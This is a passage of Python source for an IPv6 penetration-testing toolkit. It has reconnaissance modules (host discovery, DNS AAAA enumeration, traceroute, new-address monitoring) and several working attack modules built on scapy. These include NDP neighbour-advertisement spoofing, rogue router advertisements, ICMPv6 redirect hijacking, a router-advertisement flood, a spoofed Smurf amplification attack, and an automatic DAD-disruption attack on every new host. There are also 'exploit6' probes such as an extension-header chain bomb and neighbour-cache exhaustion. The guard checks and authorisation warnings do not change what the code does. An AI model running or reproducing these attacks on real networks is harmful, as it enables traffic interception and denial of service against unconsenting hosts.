        src = f"fe80::{random.randint(1, 0xffff):x}:{random.randint(1, 0xffff):x}"
        return src, mac


# ═══════════════════════════════════════════════════════════════════════════════
#  RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimiter:
    """Token-bucket rate limiter, thread-safe."""

    def __init__(self, rate_pps: int = 100):
        self._interval = 1.0 / max(rate_pps, 1)
        self._last     = 0.0
        self._lock     = threading.Lock()

    def wait(self):
        with self._lock:
            now  = time.monotonic()
            wait = self._interval - (now - self._last)
            if wait > 0:
                time.sleep(wait)
            self._last = time.monotonic()

    def update_rate(self, rate_pps: int):
        with self._lock:
            self._interval = 1.0 / max(rate_pps, 1)


# ═══════════════════════════════════════════════════════════════════════════════
#  PRIVILEGE & DEPENDENCY CHECK
# ═══════════════════════════════════════════════════════════════════════════════

def require_root():
    if os.geteuid() != 0:
        log_err("Root privileges required for raw socket operations.")
        log_warn(f"Run:  {c(CY, f'sudo python3 {sys.argv[0]}')}")
        sys.exit(1)

def check_dependencies():
    missing = []
    if not SCAPY_OK:      missing.append('scapy')
    if not NETIFACES_OK:  missing.append('netifaces')
    if not DNSPYTHON_OK:  missing.append('dnspython')
    if missing:
        log_warn(f"Optional dependencies missing: {', '.join(c(YL, m) for m in missing)}")
        log_dim(f"Install with:  pip install {' '.join(missing)}")
    return not missing

def _require_scapy():
    if not SCAPY_OK:
        raise RuntimeError("Scapy is required for this module. "
                           "Run: pip install scapy")


# ═══════════════════════════════════════════════════════════════════════════════
#  PROGRESS DISPLAY
# ═══════════════════════════════════════════════════════════════════════════════

class ProgressTracker:
    """Simple CLI progress display (works without Rich)."""

    def __init__(self, total: int, label: str = ''):
        self._total   = total
        self._current = 0
        self._label   = label
        self._lock    = threading.Lock()
        self._start   = time.monotonic()

    def update(self, n: int = 1):
        with self._lock:
            self._current = min(self._current + n, self._total)
            self._render()

    def _render(self):
        if not self._total:
            return
        pct     = self._current / self._total
        elapsed = time.monotonic() - self._start
        eta     = (elapsed / pct * (1 - pct)) if pct > 0 else 0
        bar_w   = 30
        filled  = int(bar_w * pct)
        bar     = c(GR, '█' * filled) + c(DM, '░' * (bar_w - filled))
        print(f"\r  {bar}  {self._current}/{self._total}"
              f"  {c(DM, f'ETA {eta:.0f}s')}", end='', flush=True)

    def done(self):
        print()  # newline after progress bar


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: ALIVE6
# ═══════════════════════════════════════════════════════════════════════════════

def run_alive6() -> ScanResult:
    _require_scapy()
    result = ScanResult("alive6")
    log_sec("ALIVE6  —  Discover Alive IPv6 Hosts")

    iface   = prompt_iface()
    target  = prompt("Target  (IPv6 address or prefix  e.g. fe80::/64)")
    timeout = prompt_float("Timeout seconds", 2.0)
    retries = prompt_int("Ping retries", 2, 1, 10)

    result.metadata['interface'] = iface
    result.metadata['target']    = target

    log_info(f"Scanning  {c(CY, target)}  on  {c(CY, iface)}")
    print(SEP)

    _send_times: Dict[int, float] = {}

    def _on_pkt(pkt):
        if ICMPv6EchoReply not in pkt:
            return
        src = pkt[IPv6].src
        h   = IPv6Host(ipv6=src, is_alive=True)
        # Try to derive MAC from Ethernet header
        if Ether in pkt:
            h.mac = pkt[Ether].src.upper()
            h.vendor = IPv6Utils.mac_vendor(h.mac)
        seq = pkt[ICMPv6EchoReply].seq if ICMPv6EchoReply in pkt else 0
        t0  = _send_times.get(seq, 0)
        h.rtt      = (time.time() - t0) * 1000 if t0 else 0.0
        h.hostname = IPv6Utils.reverse_dns(src)
        result.add_host(h)
        result.update_stats(received=1)
        vendor_str = f"  {c(DM, h.vendor)}" if h.vendor else ''
        host_str   = f"  {c(DM, h.hostname)}" if h.hostname else ''
        log_info(f"{c(GR, src):<45}  RTT {h.rtt:.2f} ms"
                 f"{vendor_str}{host_str}")

    if '/' in target:
        # Subnet scan: send RS + all-nodes multicast ping, sniff for replies
        src_mac = IPv6Utils.get_interface_mac(iface)
        rs_pkt  = PktFactory.rs(src_mac)
        send(rs_pkt, iface=iface, verbose=0)
        log_dim("Sent Router Solicitation …")
        # Also ping all-nodes multicast to trigger NDP responses
        try:
            ping_all = PktFactory.echo_request(dst="ff02::1", seq=1)
            send(ping_all, iface=iface, verbose=0)
            log_dim("Sent ICMPv6 echo to ff02::1 (all-nodes multicast) …")
        except Exception:
            pass
        log_dim(f"Listening for {timeout}s …")
        sniff(iface=iface, timeout=timeout, prn=_on_pkt, store=0,
              filter="icmp6")
    else:
        # Single target
        try:
            ipaddress.IPv6Address(target)
        except ValueError:
            log_err(f"Invalid IPv6 address: {target!r}")
            result.complete()
            return result

        for attempt in range(1, retries + 1):
            pkt   = PktFactory.echo_request(dst=target, seq=attempt)
            t0    = time.time()
            _send_times[attempt] = t0
            reply = sr1(pkt, iface=iface, timeout=timeout, verbose=0)
            result.update_stats(sent=1)
            if reply and ICMPv6EchoReply in reply:
                _on_pkt(reply)
                break
            else:
                log_dim(f"Attempt {attempt}/{retries} — no reply.")
        else:
            log_warn(f"{target} did not respond after {retries} attempts.")

    result.complete()
    _print_summary(result)
    _history.record("alive6", target, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: DNSDICT6
# ═══════════════════════════════════════════════════════════════════════════════

BUILTIN_WORDS = [
    "www", "ipv6", "ip6", "v6", "six", "test", "mail", "smtp", "pop",
    "imap", "webmail", "ns1", "ns2", "ns3", "ns4", "dns", "router",
    "gateway", "gw", "firewall", "fw", "vpn", "proxy", "secure", "ssl",
    "ssh", "ftp", "sftp", "ntp", "time", "syslog", "snmp", "radius",
    "ldap", "ldaps", "ad", "dc", "pdc", "bdc", "exchange", "owa",
    "mysql", "postgres", "db", "database", "redis", "elastic", "kafka",
    "jenkins", "gitlab", "github", "wiki", "admin", "cpanel", "webmin",
    "portal", "api", "api-v2", "api-v3", "cdn", "static", "assets",
    "media", "img", "images", "download", "downloads", "files",
    "remote", "vpn2", "mgmt", "monitor", "nagios", "zabbix", "grafana",
    "prometheus", "k8s", "kube", "docker", "registry", "ci", "cd",
    "staging", "dev", "qa", "prod", "backup", "storage", "nfs",
    "samba", "smb", "print", "scanner", "iot", "cam", "camera",
]


def run_dnsdict6() -> ScanResult:
    result = ScanResult("dnsdict6")
    log_sec("DNSDICT6  —  IPv6 DNS Enumeration")

    domain     = prompt("Target domain  (e.g. example.com)")
    if not domain:
        log_err("Domain is required.")
        result.complete()
        return result

    dns_server = prompt("DNS server  (leave blank for system default)") or None
    wordlist   = prompt("Custom wordlist file  (leave blank for built-in)") or None
    threads    = prompt_int("Threads", 20, 1, 100)

    names = BUILTIN_WORDS
    if wordlist:
        wl_path = Path(wordlist)
        if wl_path.exists():
            names = [l.strip() for l in wl_path.read_text().splitlines()
                     if l.strip() and not l.startswith('#')]
            log_info(f"Loaded  {len(names)}  entries from  {c(CY, wordlist)}")
        else:
            log_warn(f"Wordlist not found: {wordlist!r} — using built-in list.")

    result.metadata['target']  = domain
    result.metadata['threads'] = threads

    log_info(f"Enumerating  {c(CY, domain)}  with  {c(CY, str(len(names)))}  "
             f"names  ({threads} threads)")
    print(SEP)

    found   = 0
    tracker = ProgressTracker(len(names), domain)

    # Configure DNS resolver
    resolver = None
    if DNSPYTHON_OK:
        resolver = dns.resolver.Resolver()
        resolver.lifetime = float(_config.get('dns', 'query_timeout', '2'))
        resolver.timeout  = resolver.lifetime
        if dns_server:
            resolver.nameservers = [dns_server]

    def _query(name: str) -> Tuple[str, Optional[str], Optional[str]]:
        fqdn = f"{name}.{domain}" if not name.endswith(f".{domain}") else name
        # Try AAAA via dnspython
        if resolver:
            with suppress(Exception):
                for ans in resolver.resolve(fqdn, 'AAAA'):
                    ipv6 = str(ans)
                    cname = None
                    with suppress(Exception):
                        cname_ans = resolver.resolve(fqdn, 'CNAME')
                        cname = str(cname_ans[0])
                    return fqdn, ipv6, cname
        # Fallback to getaddrinfo
        with suppress(Exception):
            ipv6 = socket.getaddrinfo(fqdn, None, socket.AF_INET6)[0][4][0]
            return fqdn, ipv6, None
        return fqdn, None, None

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_query, n): n for n in names}
        for fut in concurrent.futures.as_completed(futs):
            tracker.update()
            fqdn, ipv6, cname = fut.result()
            if ipv6:
                found += 1
                host = IPv6Host(ipv6=ipv6, hostname=fqdn)
                result.add_host(host)
                result.add_finding(Finding(
                    name='DNS AAAA Record',
                    description=f"{fqdn} → {ipv6}",
                    severity=Severity.INFO,
                    module='dnsdict6',
                    target=fqdn,
                    evidence={'fqdn': fqdn, 'ipv6': ipv6, 'cname': cname},
                ))
                extra = f"  {c(DM, f'CNAME→{cname}')}" if cname else ''
                log_info(f"{c(CY, fqdn):<52} {c(GR, ipv6)}{extra}")

    tracker.done()
    result.complete()
    print(SEP)
    log_info(f"Found  {c(GR, str(found))}  AAAA records.")
    _history.record("dnsdict6", domain, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: DETECT-NEW-IP6
# ═══════════════════════════════════════════════════════════════════════════════

def run_detect_new_ip6() -> ScanResult:
    _require_scapy()
    result = ScanResult("detect-new-ip6")
    log_sec("DETECT-NEW-IP6  —  Monitor for New IPv6 Addresses")

    iface    = prompt_iface()
    network  = prompt("Network to monitor  (e.g. fe80::/64  or  * for all)") or '*'
    duration = prompt("Duration seconds  (blank = unlimited, Ctrl+C to stop)") or None
    duration = int(duration) if duration else None
    alert_on_router = confirm("Alert when a router is detected?", True)

    result.metadata['interface'] = iface
    result.metadata['target']    = network

    log_info(f"Monitoring  {c(CY, network)}  on  {c(CY, iface)}")
    if alert_on_router:
        log_dim("Router detection enabled.")
    print(SEP)

    known: Dict[str, float] = {}

    def _on_pkt(pkt):
        if IPv6 not in pkt:
            return
        src = pkt[IPv6].src
        if src.startswith('::') or src == 'fe80::':
            return  # ignore unspecified / invalid
        if network != '*' and not IPv6Utils.in_network(src, network):
            return
        if src not in known:
            known[src] = time.time()
            mac = pkt[Ether].src.upper() if Ether in pkt else None
            h   = IPv6Host(ipv6=src, mac=mac, is_alive=True)
            h.vendor   = IPv6Utils.mac_vendor(mac) if mac else None
            h.hostname = IPv6Utils.reverse_dns(src)
            # Detect if it's a router via RA
            if ICMPv6ND_RA in pkt:
                h.is_router = True
                h.tags.add('router')
            result.add_host(h)
            result.update_stats(received=1)

            ts  = datetime.now().strftime('%H:%M:%S')
            msg = f"{c(DM, ts)}  {c(GR, src)}"
            if mac:        msg += f"  MAC:{c(CY, mac)}"
            if h.vendor:   msg += f"  ({c(DM, h.vendor)})"
            if h.hostname: msg += f"  {c(DM, h.hostname)}"
            if h.is_router and alert_on_router:
                msg += f"  {c(RD+BD, '⚠ ROUTER')}"
            log_info(msg)

    stop_ev = threading.Event()

    def _sniff():
        sniff(iface=iface, prn=_on_pkt, store=0,
              stop_filter=lambda _: stop_ev.is_set(),
              filter="ip6")

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()

    try:
        if duration:
            t.join(duration)
            stop_ev.set()
        else:
            log_warn("Press Ctrl+C to stop monitoring.")
            while t.is_alive():
                t.join(0.5)
    except KeyboardInterrupt:
        stop_ev.set()

    result.complete()
    _print_summary(result)
    _history.record("detect-new-ip6", network, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: TRACE6
# ═══════════════════════════════════════════════════════════════════════════════

def run_trace6() -> ScanResult:
    _require_scapy()
    result = ScanResult("trace6")
    log_sec("TRACE6  —  IPv6 Traceroute")

    iface    = prompt_iface()
    target   = prompt_ipv6("Target IPv6 address")
    max_hops = prompt_int("Max hops", 30, 1, 64)
    timeout  = prompt_float("Timeout per hop (s)", 1.5)
    port     = prompt_int("TCP destination port", 80, 1, 65535)
    proto    = prompt_choice("Protocol", ['tcp', 'udp', 'icmp'], 'tcp')

    result.metadata['interface'] = iface
    result.metadata['target']    = target

    log_info(f"Tracing route to  {c(CY, target)}  via  {c(DM, proto.upper())}")
    print(SEP)
    print(f"  {c(YL,'Hop'):>5}  {c(YL,'Address'):<48}  {c(YL,'Hostname'):<30}  {c(YL,'RTT')}")
    print("  " + "─" * 96)

    for ttl in range(1, max_hops + 1):
        if proto == 'tcp':
            pkt = IPv6(dst=target, hlim=ttl) / TCP(dport=port, flags="S",
                        sport=random.randint(1024, 65535),
                        seq=random.randint(0, 2**32 - 1))
        elif proto == 'udp':
            pkt = IPv6(dst=target, hlim=ttl) / UDP(dport=port + ttl)
        else:
            pkt = IPv6(dst=target, hlim=ttl) / ICMPv6EchoRequest(seq=ttl)

        t0    = time.time()
        reply = sr1(pkt, iface=iface, timeout=timeout, verbose=0)
        rtt   = (time.time() - t0) * 1000
        result.update_stats(sent=1)

        if reply and IPv6 in reply:
            src  = reply[IPv6].src
            host = IPv6Utils.reverse_dns(src) or ''
            col  = GR if src == target else WH
            result.add_hop(ttl, src, rtt)
            print(f"  {c(CY, str(ttl)):>8}  {c(col, src):<57}  "
                  f"{c(DM, host[:28]):<38}  {rtt:.2f} ms")
            if src == target:
                log_info("Target reached.")
                break
        else:
            print(f"  {c(CY, str(ttl)):>8}  {c(DM, '*  *  *  (no reply)')}")

    result.complete()
    _history.record("trace6", target, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: PARASITE6
# ═══════════════════════════════════════════════════════════════════════════════

def run_parasite6() -> ScanResult:
    if not _offensive_guard('parasite6'):
        r = ScanResult('parasite6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("parasite6")
    log_sec("PARASITE6  —  NDP Neighbour Advertisement Spoof")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface      = prompt_iface()
    target_ip  = prompt_ipv6("Target IPv6  (victim)")
    target_mac = prompt_mac ("Target MAC")
    spoof_ip   = prompt_ipv6("IP to spoof  (redirect traffic here)")
    spoof_mac  = prompt_mac ("MAC to advertise  (typically your MAC)")
    interval   = prompt_float("Interval seconds between packets", 5.0)
    max_pkts   = prompt_int("Max packets  (0 = unlimited)", 0, 0, 100000)

    result.metadata['interface'] = iface
    result.metadata['target']    = target_ip

    pkt = PktFactory.na(target_ip, spoof_ip, spoof_mac,
                         router=False, solicited=False, override=True)

    log_warn(f"Sending spoofed NA every {interval}s — Ctrl+C to stop.")
    print(SEP)

    count = 0
    rl    = RateLimiter(max(1, int(1 / interval)))
    try:
        while True:
            send(pkt, iface=iface, verbose=0)
            count += 1
            result.update_stats(sent=1)
            ts = datetime.now().strftime('%H:%M:%S')
            log_dim(f"{ts}  Sent spoofed NA  #{count}")
            if max_pkts and count >= max_pkts:
                break
            rl.wait()
    except KeyboardInterrupt:
        pass

    result.complete()
    log_info(f"Sent  {c(GR, str(count))}  spoofed NA packets.")
    _history.record("parasite6", target_ip, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: FAKE_ROUTER6
# ═══════════════════════════════════════════════════════════════════════════════

def run_fake_router6() -> ScanResult:
    if not _offensive_guard('fake_router6'):
        r = ScanResult('fake_router6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("fake_router6")
    log_sec("FAKE_ROUTER6  —  Rogue Router Advertisement")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface      = prompt_iface()
    router_ip  = prompt("Fake router IPv6  (link-local, e.g. fe80::1)")
    router_mac = prompt_mac("Fake router MAC  (your interface MAC)")
    prefix     = prompt("IPv6 prefix to advertise  (e.g. 2001:db8::/64)")
    lifetime   = prompt_int("Prefix lifetime seconds", 1800, 30, 86400)
    interval   = prompt_float("RA interval seconds", 3.0)
    max_pkts   = prompt_int("Max packets  (0 = unlimited)", 0, 0, 100000)

    try:
        net        = ipaddress.IPv6Network(prefix, strict=False)
        prefix_ip  = str(net.network_address)
        prefix_len = net.prefixlen
    except ValueError:
        log_err(f"Invalid prefix: {prefix!r}")
        result.complete()
        return result

    result.metadata['interface'] = iface
    result.metadata['target']    = prefix

    pkt   = PktFactory.ra(router_ip, router_mac, prefix_ip,
                           prefix_len, lifetime, lifetime)
    count = 0

    log_warn(f"Sending fake RAs every {interval}s — Ctrl+C to stop.")
    print(SEP)

    try:
        while True:
            send(pkt, iface=iface, verbose=0)
            count += 1
            result.update_stats(sent=1)
            ts = datetime.now().strftime('%H:%M:%S')
            log_dim(f"{ts}  Sent fake RA  #{count}")
            if max_pkts and count >= max_pkts:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    result.complete()
    log_info(f"Sent  {c(GR, str(count))}  fake RA packets.")
    _history.record("fake_router6", prefix, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: REDIR6
# ═══════════════════════════════════════════════════════════════════════════════

def run_redir6() -> ScanResult:
    if not _offensive_guard('redir6'):
        r = ScanResult('redir6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("redir6")
    log_sec("REDIR6  —  ICMPv6 Redirect Attack")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface        = prompt_iface()
    target_ip    = prompt_ipv6("Target IPv6  (victim)")
    target_mac   = prompt_mac ("Target MAC")
    original_dst = prompt_ipv6("Original destination IPv6")
    new_dst      = prompt_ipv6("New destination IPv6  (attacker)")
    attacker_mac = prompt_mac ("Attacker MAC  (your MAC)")
    count        = prompt_int("Packet count", 5, 1, 1000)
    delay        = prompt_float("Delay between packets (s)", 0.5)

    result.metadata['interface'] = iface
    result.metadata['target']    = target_ip

    pkt = PktFactory.redirect(target_ip, original_dst, new_dst,
                               target_mac, attacker_mac)

    log_info(f"Sending {count} redirect packets to  {c(CY, target_ip)}")
    print(SEP)

    for i in range(count):
        send(pkt, iface=iface, verbose=0)
        result.update_stats(sent=1)
        log_dim(f"Redirect  {i+1}/{count}  "
                f"{target_ip} → {new_dst}")
        time.sleep(delay)

    result.complete()
    log_info(f"Sent  {c(GR, str(count))}  redirect packets.")
    _history.record("redir6", target_ip, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: FLOOD_ROUTER6
# ═══════════════════════════════════════════════════════════════════════════════

def run_flood_router6() -> ScanResult:
    if not _offensive_guard('flood_router6'):
        r = ScanResult('flood_router6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("flood_router6")
    log_sec("FLOOD_ROUTER6  —  Router Advertisement Flood")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface    = prompt_iface()
    target   = prompt("Target IPv6  (blank = ff02::1 all-hosts)") or None
    rate     = prompt_int("Rate packets/second", 100, 1, 10000)
    duration = prompt("Duration seconds  (blank = unlimited)") or None
    duration = int(duration) if duration else None

    result.metadata['interface'] = iface
    result.metadata['target']    = target or 'ff02::1'

    log_warn(f"Flooding at  {rate} pps — Ctrl+C to stop.")
    print(SEP)

    rl         = RateLimiter(rate)
    count      = 0
    start      = time.monotonic()
    stop_event = threading.Event()
    _lock      = threading.Lock()

    def _flood():
        nonlocal count
        while not stop_event.is_set():
            src_ip, src_mac = PktFactory.random_ra_mac()
            prefix  = (f"2001:{random.randint(0,0xffff):x}:"
                       f"{random.randint(0,0xffff):x}::")
            pkt = PktFactory.ra(src_ip, src_mac, prefix,
                                 lifetime=random.randint(30, 3600))
            if target:
                pkt[IPv6].dst = target
            send(pkt, iface=iface, verbose=0)
            with _lock:
                count += 1
            if count % 200 == 0:
                elapsed = time.monotonic() - start
                log_dim(f"Sent {count}  ({count/max(elapsed,0.001):.0f} pps avg)")
            rl.wait()
            if duration and (time.monotonic() - start) >= duration:
                stop_event.set()

    t = threading.Thread(target=_flood, daemon=True)
    t.start()
    try:
        if duration:
            t.join(duration + 2)
        else:
            log_warn("Press Ctrl+C to stop flooding.")
            while t.is_alive():
                t.join(0.5)
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        stop_event.set()

    result.update_stats(sent=count)
    result.complete()
    elapsed = time.monotonic() - start
    log_info(f"Sent  {c(GR, str(count))}  packets in  {elapsed:.1f}s  "
             f"({count/max(elapsed,0.001):.0f} pps avg).")
    _history.record("flood_router6", target or 'ff02::1', result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: SMURF6
# ═══════════════════════════════════════════════════════════════════════════════

def run_smurf6() -> ScanResult:
    if not _offensive_guard('smurf6'):
        r = ScanResult('smurf6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("smurf6")
    log_sec("SMURF6  —  IPv6 Smurf Amplification")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface     = prompt_iface()
    target    = prompt_ipv6("Target IPv6  (victim — will be spoofed source)")
    amplifier = prompt("Amplifier multicast / anycast address")
    count     = prompt_int("Packet count", 1000, 1, 100000)
    rate      = prompt_int("Rate packets/second", 100, 1, 10000)

    result.metadata['interface'] = iface
    result.metadata['target']    = target

    log_warn(f"Sending {count} amplified echo requests — victim: {c(RD, target)}")
    print(SEP)

    rl = RateLimiter(rate)
    for i in range(count):
        pkt = PktFactory.echo_request(dst=amplifier, src=target, seq=i)
        send(pkt, iface=iface, verbose=0)
        result.update_stats(sent=1)
        if i % 200 == 0 and i > 0:
            log_dim(f"Sent {i}/{count}")
        rl.wait()

    result.complete()
    log_info(f"Attack complete —  {c(GR, str(count))}  packets sent.")
    _history.record("smurf6", target, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: DOS-NEW-IP6
# ═══════════════════════════════════════════════════════════════════════════════

def run_dos_new_ip6() -> ScanResult:
    if not _offensive_guard('dos_new_ip6'):
        r = ScanResult('dos_new_ip6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("dos-new-ip6")
    log_sec("DOS-NEW-IP6  —  Block New IPv6 Hosts via DAD Disruption")
    log_warn("Use only on networks you are authorised to test.")
    print(SEP)

    iface    = prompt_iface()
    network  = prompt("Network to watch  (e.g. fe80::/64)")
    na_count = prompt_int("NA packets per new host", 10, 1, 100)
    rate     = prompt_int("NA rate pps", 20, 1, 1000)

    result.metadata['interface'] = iface
    result.metadata['target']    = network

    log_warn(f"Monitoring  {network}  — blocking new hosts as they appear.")
    log_warn("Ctrl+C to stop.")
    print(SEP)

    known    = set()
    our_mac  = IPv6Utils.get_interface_mac(iface)
    rl       = RateLimiter(rate)

    def _attack(target_ip: str, target_mac: str):
        mac = target_mac or "00:00:00:00:00:00"
        for _ in range(na_count):
            pkt = PktFactory.na(target_ip, target_ip, mac,
                                 router=True, solicited=False, override=True)
            send(pkt, iface=iface, verbose=0)
            result.update_stats(sent=1)
            rl.wait()
        log_dim(f"DoS complete on  {c(RD, target_ip)}")

    def _on_pkt(pkt):
        if IPv6 not in pkt:
            return
        src = pkt[IPv6].src
        if src.startswith('::'):
            return
        if not IPv6Utils.in_network(src, network):
            return
        if src not in known:
            known.add(src)
            mac = pkt[Ether].src if Ether in pkt else None
            h   = IPv6Host(ipv6=src, mac=mac)
            result.add_host(h)
            ts  = datetime.now().strftime('%H:%M:%S')
            log_warn(f"{ts}  New host: {c(YL, src)}  MAC: {c(CY, mac or '?')}  — attacking …")
            threading.Thread(target=_attack, args=(src, mac or "00:00:00:00:00:00"),
                             daemon=True).start()

    try:
        sniff(iface=iface, prn=_on_pkt, store=0, filter="icmp6")
    except KeyboardInterrupt:
        pass

    result.complete()
    _print_summary(result)
    _history.record("dos-new-ip6", network, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: EXPLOIT6
# ═══════════════════════════════════════════════════════════════════════════════

# ── Individual test functions ─────────────────────────────────────────────────

def _test_fragmentation(target: str, iface: str, port: int) -> Optional[Finding]:
    try:
        pkt   = IPv6(dst=target) / ICMPv6EchoRequest(data=b'X' * 2000)
        reply = sr1(pkt, iface=iface, timeout=2, verbose=0)
        if not reply:
            return Finding(
                name='ICMPv6 Large Packet / Fragmentation',
                description='No response to oversized ICMPv6 echo; host may '
                            'crash or drop packets under fragment flood.',
                severity=Severity.MEDIUM, module='exploit6', target=target,
                mitigations=['Enable fragment reassembly timeout limits',
                             'Deploy IPv6-aware stateful firewall'],
                references=['RFC 8200 §4.5'],
            )
    except Exception:
        pass
    return None


def _test_rogue_ra(target: str, iface: str, port: int) -> Optional[Finding]:
    try:
        pkt = PktFactory.ra("fe80::dead:1", "00:11:22:33:44:55",
                             "2001:db8:dead:beef::", lifetime=300)
        send(pkt, iface=iface, verbose=0)
        time.sleep(1)
        reply = sr1(PktFactory.echo_request("2001:db8:dead:beef::1"),
                    iface=iface, timeout=2, verbose=0)
        if reply:
            return Finding(
                name='Rogue Router Advertisement Acceptance',
                description='Host accepted and acted on a RA from an '
                            'unknown / unverified source.',
                severity=Severity.HIGH, module='exploit6', target=target,
                mitigations=['Deploy RA-Guard on L2 switches (RFC 6105)',
                             'Enable SEND (Secure Neighbour Discovery, RFC 3971)'],
                references=['RFC 6104', 'RFC 6105', 'CVE-2010-multiple'],
            )
    except Exception:
        pass
    return None


def _test_ncache(target: str, iface: str, port: int) -> Optional[Finding]:
    try:
        for i in range(20):
            src_mac = f"00:{i:02x}:{i:02x}:{i:02x}:{i:02x}:{i:02x}"
            pkt = PktFactory.ns(f"fe80::{i:04x}", f"fe80::dead:{i:04x}", src_mac)
            send(pkt, iface=iface, verbose=0)
        reply = sr1(PktFactory.echo_request(target),
                    iface=iface, timeout=2, verbose=0)
        if not reply:
            return Finding(
                name='Neighbour Cache Exhaustion (NDP DoS)',
                description='Target stopped responding after NDP cache '
                            'flooding — possible NCE DoS vulnerability.',
                severity=Severity.MEDIUM, module='exploit6', target=target,
                mitigations=['Limit NDP cache table size',
                             'Rate-limit incoming NS packets'],
                references=['RFC 6583'],
            )
    except Exception:
        pass
    return None


def _test_dad(target: str, iface: str, port: int) -> Optional[Finding]:
    try:
        pkt = PktFactory.ns(target, "::", "00:11:22:33:44:55")
        send(pkt, iface=iface, verbose=0)
        time.sleep(1.5)
        reply = sr1(PktFactory.echo_request(target),
                    iface=iface, timeout=2, verbose=0)
        if not reply:
            return Finding(
                name='Duplicate Address Detection (DAD) DoS',
                description='Host may have dropped its address after spoofed '
                            'DAD conflict, becoming unreachable.',
                severity=Severity.MEDIUM, module='exploit6', target=target,
                mitigations=['Enable SEND (RFC 3971)',
                             'Use privacy addresses (RFC 4941)'],
                references=['RFC 4862 §5.4', 'RFC 3971'],
            )
    except Exception:
        pass
    return None


def _test_ext_headers(target: str, iface: str, port: int) -> Optional[Finding]:
    try:
        pkt = IPv6(dst=target, nh=0)
        for _ in range(40):
            pkt = pkt / IPv6ExtHdrHopByHop(options=[PadN(optdata=b'\x00' * 6)])
        pkt = pkt / ICMPv6EchoRequest()
        reply = sr1(pkt, iface=iface, timeout=3, verbose=0)
        if not reply:
            return Finding(
                name='Extension Header Chain Bomb',
                description='Host did not respond to packet with excessive '
                            'chained extension headers — possible crash risk.',
                severity=Severity.CRITICAL, module='exploit6', target=target,
                mitigations=['Drop packets exceeding extension header depth limit',
                             'Implement RFC 7112 — "Impossible IP Fragments"'],
                references=['RFC 7112', 'RFC 8200'],
            )
    except Exception:
        pass
    return None


def _test_type0_rh(target: str, iface: str, port: int) -> Optional[Finding]:
    """Test for deprecated Type 0 Routing Header acceptance."""
    try:
        from scapy.layers.inet6 import IPv6ExtHdrRouting
        pkt   = (IPv6(dst=target)
                 / IPv6ExtHdrRouting(type=0, addresses=["::1"])
                 / ICMPv6EchoRequest())
        reply = sr1(pkt, iface=iface, timeout=2, verbose=0)
        if reply and ICMPv6EchoReply in reply:
            return Finding(
                name='Type 0 Routing Header (RH0) Accepted',
                description='Host accepted a deprecated Type 0 Routing Header '
                            'which can be used for amplification attacks.',
                severity=Severity.HIGH, module='exploit6', target=target,
                mitigations=['Drop all RH0 packets at firewall',
                             'Ensure OS is patched (deprecated since RFC 5095)'],
                references=['RFC 5095'],
                cve='CVE-2007-2242',
            )
    except Exception:
        pass
    return None


EXPLOIT_TESTS = [
    ("Fragmentation / large packet",       _test_fragmentation),
    ("Rogue RA acceptance",                _test_rogue_ra),
    ("Neighbour cache exhaustion",         _test_ncache),
    ("DAD DoS",                            _test_dad),
    ("Extension header chain bomb",        _test_ext_headers),
    ("Type 0 Routing Header (RH0)",        _test_type0_rh),
]


def run_exploit6() -> ScanResult:
    if not _offensive_guard('exploit6'):
        r = ScanResult('exploit6')
        try:
            r.summary = 'DRY-RUN/LAB-LOCKED: no live packets sent'
        except Exception:
            pass
        return r
    _require_scapy()
    result = ScanResult("exploit6")
    log_sec("EXPLOIT6  —  IPv6 Vulnerability Assessment")

    iface  = prompt_iface()
    target = prompt_ipv6("Target IPv6 address")
    port   = prompt_int("TCP port for connectivity checks", 80, 1, 65535)

    result.metadata['interface'] = iface
    result.metadata['target']    = target

    log_info(f"Running  {len(EXPLOIT_TESTS)}  checks on  {c(CY, target)}")
    print(SEP)

    vuln_count = 0
    for name, fn in EXPLOIT_TESTS:
        log_dim(f"Testing  {name} …")
        try:
            finding = fn(target, iface, port)
            if finding:
                vuln_count += 1
                sev_str = c(finding.severity.color, finding.severity.value)
                log_warn(f"{sev_str}  —  {finding.name}")
                log_dim(f"   {finding.description}")
                if finding.mitigations:
                    log_dim(f"   Mitigation: {finding.mitigations[0]}")
                result.add_finding(finding)
            else:
